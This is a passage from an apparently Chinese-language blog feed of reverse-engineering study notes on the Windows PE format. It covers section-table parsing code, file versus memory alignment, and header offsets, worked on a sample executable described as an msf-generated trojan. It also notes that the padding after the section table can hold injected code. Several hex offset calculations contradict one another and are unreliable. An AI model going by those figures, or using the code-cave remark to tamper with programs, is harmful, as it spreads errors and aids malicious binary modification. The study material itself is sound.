class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">VaToFoa32</span>(<span class="number">0x4198B0</span>, dos, (_IMAGE_NT_HEADERS *)nt, sectionArr);</span><br><span class="line">        <span class="built_in">FoaToVa32</span>(<span class="number">0x176B0</span>, dos, (_IMAGE_NT_HEADERS * )nt, sectionArr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据代码，我们可以.data区块的RVA值</p>
<img src="/images/PE结构-VA与FOA的转化.assets/image-20211014162356982.png" alt="image-20211014162356982" style="zoom:200%;">

<p>本文复现学习自52pojie.cn论坛的lyl610abc师傅PE文件笔记。</p>
<p>原文连接：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.52pojie.cn/thread-1412395-1-1.html</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-PE文件的两种状态</title>
    <url>/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/</url>
    <content><![CDATA[<p>本文的是学习复现自吾爱破解dalao <a href="https://www.52pojie.cn/thread-1393291-1-1.html">lyl610abc</a>的PE文件解析系列，非本人原创，属于学习笔记(大佬yyds!)。</p>
<h3 id="PE文件的两种状态"><a href="#PE文件的两种状态" class="headerlink" title="PE文件的两种状态"></a>PE文件的两种状态</h3><p>PE文件处于磁盘中与处于内存中时，两者的结构会稍微发生改变。</p>
<span id="more"></span>

<p>一个PE文件可以分为两种状态:</p>
<p>运行态: 当一个PE文件被打开时，PE文件的相关数据将会被<code>装载</code>到内存中，根据文件对齐以及内存对齐中的区别，文件的大小以以及结构会发生相应的改变</p>
<p>非运行态: 当一个PE文件尚未运行时，其数据存储在<code>磁盘中</code>时的一种状态</p>
<p><strong>思维脑图</strong></p>
<p>  lyl610abc师傅太强了</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116145908655.png" alt="image-20211116145908655"></p>
<p><strong>PE文件整体结构表</strong></p>
<table>
<thead>
<tr>
<th>结构</th>
<th>对应C数据结构</th>
<th>默认占用空间大小（单位字节）</th>
</tr>
</thead>
<tbody><tr>
<td>DOS MZ头</td>
<td>_IMAGE_DOS_HEADER</td>
<td>64</td>
</tr>
<tr>
<td>DOS Stub</td>
<td>仅在MS-DOS系统下有效，不作研究</td>
<td>不固定</td>
</tr>
<tr>
<td>PE文件头</td>
<td>_IMAGE_NT_HEADERS</td>
<td>4+20+224=248 （标志+标准头+扩展头）</td>
</tr>
<tr>
<td>PE文件头标志</td>
<td>Signature</td>
<td>4</td>
</tr>
<tr>
<td>PE文件表头/标准PE头</td>
<td>_IMAGE_FILE_HEADER</td>
<td>20</td>
</tr>
<tr>
<td>PE文件表头可选部分/扩展PE头</td>
<td>_IMAGE_OPTIONAL_HEADER</td>
<td>224</td>
</tr>
<tr>
<td>块表/节表</td>
<td>_IMAGE_SECTION_HEADER</td>
<td>40</td>
</tr>
<tr>
<td>块/节</td>
<td>无</td>
<td>由块表/节表决定</td>
</tr>
</tbody></table>
<hr>
<h4 id="非运行态"><a href="#非运行态" class="headerlink" title="非运行态"></a>非运行态</h4><p>判断文件类型是否为PE格式文件</p>
<p>判断流程如下:</p>
<ul>
<li>判断前两个字节是否为4D 5A（MZ）</li>
<li>找到3Ch</li>
<li>根据3Ch位置的2字节大小数据跳转偏移至其中，查看是否为50 45 00 00(PE..)</li>
</ul>
<table>
<thead>
<tr>
<th>地址</th>
<th>长度（单位字节）</th>
<th>对应C的数据结构</th>
<th>说明</th>
<th>值</th>
<th>ASCII</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>2</td>
<td>_IMAGE_DOS_HEADER的第一个成员e_magic</td>
<td>DOS MZ头的第一个成员</td>
<td>4D 5A</td>
<td>MZ</td>
</tr>
<tr>
<td>3C</td>
<td>2</td>
<td>_IMAGE_DOS_HEADER的最后一个成员e_lfanew</td>
<td>指出PE头文件偏移位置</td>
<td>不定</td>
<td>不定</td>
</tr>
<tr>
<td>[3C]</td>
<td>4</td>
<td>Signature</td>
<td>PE文件头标志</td>
<td>50 45 00 00</td>
<td>PE..</td>
</tr>
</tbody></table>
<p>利用msf生成的exe马进行实例分析</p>
<p>使用十六进制编辑器打开，判断文件格式类型</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116150624182.png" alt="image-20211116150624182"></p>
<p>可以看到，00处起始位置为4D 5A，表示DOS头开头；3Ch处位置是1801 表示PE头文件偏移位置；利用Ctrl+G跳转至118,可以看到标准PE头50 45,此文件可以判断为是PE文件</p>
<p>对应表格数据为</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>说明</th>
<th>值</th>
<th>ASCII</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>DOS MZ头的第一个成员</td>
<td>4D 5A</td>
<td>MZ</td>
</tr>
<tr>
<td>3C</td>
<td>指出PE头文件偏移位置C</td>
<td>118</td>
<td></td>
</tr>
<tr>
<td>F0</td>
<td>PE文件头标志</td>
<td>50 45 00 00</td>
<td>PE..</td>
</tr>
</tbody></table>
<p>由此，我们可以发现以PE文件头标志为开始的PE头</p>
<p>根据PE结构可知，整个PE头是:<code>PE文件头标志+标准PE头+扩展PE头</code>的标准，长度大小为4+20+224=248字节</p>
<p>根据3Ch处的<code>118</code></p>
<p>后面所占的字节地址为:0x118+4+20+224=280+4+20+224=448=0xE0</p>
<p>由此可知整个PE头所占范围为0x118~0xE0</p>
<p><strong>PE文件头标志和标准PE头:</strong></p>
<p>​    0x118+2+20=200+24=0x130</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170504766.png" alt="image-20211116170504766"></p>
<p><strong>扩展PE头</strong></p>
<p>根据先前得到的标准PE头结束后，紧挨着的224个字节便是扩展PE头所占空间</p>
<p>标准pe头结束位置:0x130</p>
<p>扩展PE头所占空间:224字节</p>
<p>所以扩展PE头所占区域为: 0x130+224=304+224=528=0x210</p>
<p>由此可知，自0xE0开始到0x1C0结束，都是扩展PE头位置</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170637779.png" alt="image-20211116170637779"></p>
<p><strong>块表</strong></p>
<p>先前拿到的扩展PE头地址后16个字节为空字节，跳过，拿到第一个块表地址</p>
<p>从先前拿到的块表头地址继续往后看40个字节(块表大小) 拿到第二个块表的首地址</p>
<p>第一个块表头地址: 0x210</p>
<p>块表大小为 40字节</p>
<p>0x210+40 = 0x238</p>
<p>第一块表范围: 0x210~0x238</p>
<p>从0x238开始便是第二个块表</p>
<p>第一个块表: .text</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170758247.png" alt="image-20211116170758247"></p>
<p>第二个块表: .rdata</p>
<p>0x238+0x28=0x260 ，块表范围为0x238~0x260</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170913559.png" alt="image-20211116170913559"></p>
<p>第三个块表: .data</p>
<p>0x260+0x28=0x288,块表范围为0x260~0x288</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170953884.png" alt="image-20211116170953884"></p>
<p>第四块表 .sxdata</p>
<p>0x288+0x28=0x2B0,块表范围为0x288~0x2B0</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171048772.png" alt="image-20211116171048772"></p>
<p>第五块表 .rsrc</p>
<p>0x2B0+0x28=0x2D8,块表范围为0x2B0~0x2D8</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171132556.png" alt="image-20211116171132556"></p>
<p>第六块表 .reloc</p>
<p>0x2D8+0x28=0x300,块表范围为0x2D8~0x300.</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171308670.png" alt="image-20211116171308670"></p>
<p><strong>汇总块表</strong></p>
<table>
<thead>
<tr>
<th>块名称</th>
<th>块地址</th>
</tr>
</thead>
<tbody><tr>
<td>.text</td>
<td>0x210~0x238</td>
</tr>
<tr>
<td>.rdata</td>
<td>0x238~0x260</td>
</tr>
<tr>
<td>.data</td>
<td>0x260~0x288</td>
</tr>
<tr>
<td>.sxdata</td>
<td>0x288~0x2B0</td>
</tr>
<tr>
<td>.rsrc</td>
<td>0x2B0~0x2D8</td>
</tr>
<tr>
<td>.reloc</td>
<td>0x2D8~0x300</td>
</tr>
</tbody></table>
<p><strong>块表后的空隙</strong></p>
<p>块表后跟着的按理应该是块，但在块表后和块之前，多出了一段空间</p>
<p>此处为300~400</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171539285.png" alt="image-20211116171539285"></p>
<p>存储时不存在空隙的，被称为<code>连续存储</code></p>
<p>但在<strong>块表以及块之间是可能存在空隙的</strong>，这个空隙里面一般被填充为编译器插入的数据（也可能不存在）</p>
<p>这段间隙的修改并不会导致程序的不可运行，因此可以拿来写入自己想要的代码来对程序进行修改</p>
<p><strong>为什么会存在这段间隙呢？</strong></p>
<ul>
<li>这段间隙是由于<strong>块表与块之间没有进行连续存储</strong></li>
<li>这段长度的存在与否以及长度，取决于块的<strong>起始位置</strong></li>
<li>而块的其实位置则根据<code>扩展PE头中的成员决定</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结构体中的SizeOfHeaders成员(DWORD类型占4个字节)</p>
<p>SizeOfHeaders的含义是<code>3个头按文件对齐后的大小</code>：（DOS头+PE头+块表）大小加起来后进行<code>文件对齐</code>后得到的大小</p>
<p>自DOS头开始至块表结束，<code>头大小和为0x248</code>，此处想要拿到SizeOfHeaders成员的值，需要了解<code>文件对齐</code>的概念并对其进行对齐处理。</p>
<p><strong>什么是文件对齐？</strong></p>
<p>文件对齐的标准通过扩展PE头中定义的<code>FileAlignment(DWORD类型 占4字节)</code></p>
<p>文件对齐的要求就是SizeOfHeaders必须为FileAlignment的<code>整数倍</code></p>
<p>通过以上概念，我们可以理解，由于扩展PE头FileAlignment成员的限制，要求SizeOfHeaders必须为它的整数倍（不足则填充）；要想知道文件对齐的标准是多少，我们需要拿到FileAlignment的值</p>
<p>由于前面已知扩展PE头开始地址为:0xE0</p>
<p>FileAlignment(DWORD 4字节)地址为:0xE0+36 = 0x104</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116164142391.png" alt="image-20211116164142391"></p>
<p>FileAlignment为 00 02 00 00 即为 0x200</p>
<p>前面拿到的头大小和为0x248，显然并不是0x200的整数倍</p>
<p>其整数倍，也就是SizeOfHeader的大小应为: (0x248/200+1)*200=400</p>
<p><strong>SizeOfHeaders大小</strong></p>
<p>再通过扩展PE头成员值的方式验证计算是否正确</p>
<p>先前拿到的FileAlignment地址为0x104，再往后24字节，便是SizeOfHeaders存放地址</p>
<p>0x104+24 = 0x11C</p>
<p>SizeOfHeaders：na</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116165632063.png" alt="image-20211116165632063"></p>
<p>拿到00 04 00 00 即 0x400,是FileAlignment的整数倍</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116164459021.png" alt="image-20211116164459021"></p>
<p>可以看到，块表与块之间的间隙自0x400结束</p>
<p><strong>为什么需要文件对齐？</strong></p>
<p>跟内存对齐一样，都是为了使执行时的效率更高，方便内存与磁盘进行交换数据更有效率。</p>
<p><strong>块结构</strong></p>
<p>块的起始地址由块表中的PointerToRawData决定，<code>第一个块</code>的起始地址则有上面的SizeofHeaders决定</p>
<p>块部分存储的是数据，如何存储由块表进行决定</p>
<p><strong>块表在C中的定义</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;		<span class="comment">//块的大小</span></span><br><span class="line">    DWORD   PointerToRawData;	<span class="comment">//块在磁盘中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p><strong>块的起始地址</strong></p>
<p>找到结构体中的PointerToRawData成员（DWORD类型占4个字节)</p>
<p>PointerToRawData的含义为<code>该块在磁盘文件中的偏移</code></p>
<p>前面拿到第一个块表的首地址0x210</p>
<p>从0x210开始往后找20字节，0x210+20=0x224,拿到PointerToRawData的地址，跳转过去拿到4字节的值(磁盘文件中的偏移)</p>
<p>00 04 00 00 即 0x400<img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116172542500.png" alt="image-20211116172542500"></p>
<p>与SizeOfHeaders得到的一致，前面说过，块的起始地址由块表中的PointerToRawData决定，而第一个块的首地址由SizeOfHeaders决定，此处一致，验证了上文的说法。</p>
<p><strong>块的大小</strong></p>
<p>SizeOfRawData为块的大小(文件对齐后)</p>
<p>SizeOfRawData（Dword 4字节）就在PointerToRawData前面</p>
<p>所以其在块表中的地址为PointerToRawData-4=0x224-4=0x220</p>
<p>SizeOfRawData:</p>
<p>00 72 09 00 即为 0x97200</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116173302128.png" alt="image-20211116173302128"></p>
<p>块的大小与前面三个头(DOS+PE+块表)的大小一样，都需要满足文件对齐</p>
<p>先前拿到的FileAlignment为0x200 块的大小SizeOfRawData大小为0x97200满足整数倍条件，满足文件对齐。</p>
<p><strong>块的结束地址（下一个块的起始地址)</strong></p>
<p>块的结束地址为 块的起始地址+块的大小</p>
<p>即 0x400+0x97200 = 0x97600</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116173621872.png" alt="image-20211116173621872"></p>
<p>可以看到，第一个块与第二个块之间<code>存在空隙</code>,这段空隙是由于在文件中补足文件对齐产生的。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>在非运行态下:</p>
<ul>
<li>DOS首部和PE文件头与块表连续存储，中间没有空隙</li>
<li>块表与块之间存在<code>文件对齐</code>的影响，可能会存在间隙</li>
<li>块与块之间也可能由于<code>文件对其</code>的影响产生间隙</li>
</ul>
<p><strong>相关数据结构成员</strong></p>
<table>
<thead>
<tr>
<th>数据结构成员</th>
<th>所属数据结构</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>SizeOfHeaders</td>
<td>扩展PE头</td>
<td>头大小（文件对齐后）</td>
</tr>
<tr>
<td>FileAlignment</td>
<td>扩展PE头</td>
<td>文件对齐</td>
</tr>
<tr>
<td>PointerToRawData</td>
<td>块表</td>
<td>第一个块表的PointerToRawData由SizeOfHeaders决定，后面块表的PointerToRawData由前一个块表的PointerToRawData+SizeOfRawData决定</td>
</tr>
<tr>
<td>SizeOfRawData</td>
<td>块表</td>
<td>块表的大小（文件对齐后）</td>
</tr>
</tbody></table>
<p><strong>记录下各个结构的起始以及结束位置方便接下来与运行态比较</strong></p>
<table>
<thead>
<tr>
<th>结构</th>
<th>起始地址</th>
<th>结束地址</th>
<th>大小</th>
</tr>
</thead>
<tbody><tr>
<td>DOS部首</td>
<td>0</td>
<td>118</td>
<td>0x118=280</td>
</tr>
<tr>
<td>PE文件头</td>
<td>118</td>
<td>210</td>
<td>0xF8=248=4+20+224</td>
</tr>
<tr>
<td>块表</td>
<td>210</td>
<td>300</td>
<td>0xF0=240=6*40</td>
</tr>
<tr>
<td>前三个结构</td>
<td>0</td>
<td>400</td>
<td>0x400（文件对齐后）</td>
</tr>
<tr>
<td>第一个块</td>
<td>400</td>
<td>97600</td>
<td>0x97200（文件对齐后）</td>
</tr>
</tbody></table>
<h4 id="运行态"><a href="#运行态" class="headerlink" title="运行态"></a>运行态</h4><p>运行态，指PE文件装载入内存时，PE结构文件的状态</p>
<p><strong>加载运行态PE文件</strong></p>
<p>1.启动PE文件</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116192050095.png" alt="image-20211116192050095"></p>
<p>2.使用16进制编辑器 工具-&gt;打开主内存-&gt;选定PE程序</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116192222818.png" alt="image-20211116192222818"></p>
<p><strong>分析运行态的PE文件</strong></p>
<p>此时Dos头的偏移起始地址为00820000,结束地址为008200F0</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116192334866.png" alt="image-20211116192334866"></p>
<p>跟进偏移，到达PE头标志起始地址008200F0,可见头标志起始地址和标准PE头 </p>
<p><strong>PE头标志和标准头</strong></p>
<p>起始为008200F0 </p>
<p>结束为00820108</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116193032725.png" alt="image-20211116193032725"></p>
<p>紧随其后，便是扩展PE头，占据224字节单位</p>
<p>起始:00820108</p>
<p>结束:008201E8</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116193755733.png" alt="image-20211116193755733"></p>
<p><strong>块表</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116194147123.png" alt="image-20211116194147123"></p>
<p>块表起始位置:008201E8</p>
<p>块表结束位置:008202AF</p>
<p><strong>块表后的空隙</strong></p>
<p>根据前面的信息来看，在块表前的结构在运行态以及废运行态出了起始地址不同之外，其他的并无不同</p>
<p>在内存中，块表与块的间隙大小与文件对齐FileAlignment无关，是由<code>内存对齐</code>所决定的，内存对齐的机制与文件对齐类似，都是需为SectionAlignment所规定的的值的整数倍。</p>
<p>内存对齐的属性是由<code>_IMAGE_OPTIONAL_HEADER</code>构造体中的成员<code>SectionAlignment</code>决定的，同时，此成员其实就在<code>FileAlignment</code>(文件对齐)成员的上面</p>
<p>扩展PE头在c中的定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;                        <span class="comment">//&lt;--- 内存对齐</span></span><br><span class="line">    DWORD   FileAlignment;                                <span class="comment">//&lt;--- 文件对齐</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;                                <span class="comment">//&lt;--- 决定块的起始位置</span></span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p>利用扩展PE头中的SectionAlignment值验证理论是否正确：</p>
<p>从扩展PE头首地址00820108开始数32（1word 2bytes 7dword =1 + 2 + 28）个字节，到820128处，拿到SectionAlignment值</p>
<p>00 10 00 00 即 0x1000</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116195441400.png" alt="image-20211116195441400"></p>
<p>即内存对齐的基数为0x1000</p>
<p>同时，在内存中的PE文件块结构，头地址与SizeofHeaders值无关，因为SizeOfHeaders是文件对齐(FileAlignMent)专用</p>
<p><strong>块</strong></p>
<p>在非运行态中，块的起始位置由PointerToRawData决定，且PointerToRawData必须为FileAlignment的整数倍</p>
<p>但在运行态中，块的起始位置则并不由PointerToRawData决定，PointerToRawData和SizeOfHeaders一样都为文件对齐专用</p>
<p>运行态块存储涉及点较多，此处只对第一个块的起始地址，结束地址以及大小做计算</p>
<p><strong>块的起始地址</strong></p>
<p>第一个块的起始地址，取决于(DOS头+PE头+块表)总大小的和进行内存对齐后的结果。</p>
<p>三大头加起来的地址为8202AF为止，根据SectionAlignment的值1000h计算，需要进行补齐操作，补齐至821000达到1000的整数倍</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116200746213.png" alt="image-20211116200746213"></p>
<p>可以看到第一个块的首地址已经发现:</p>
<p>首地址:821000</p>
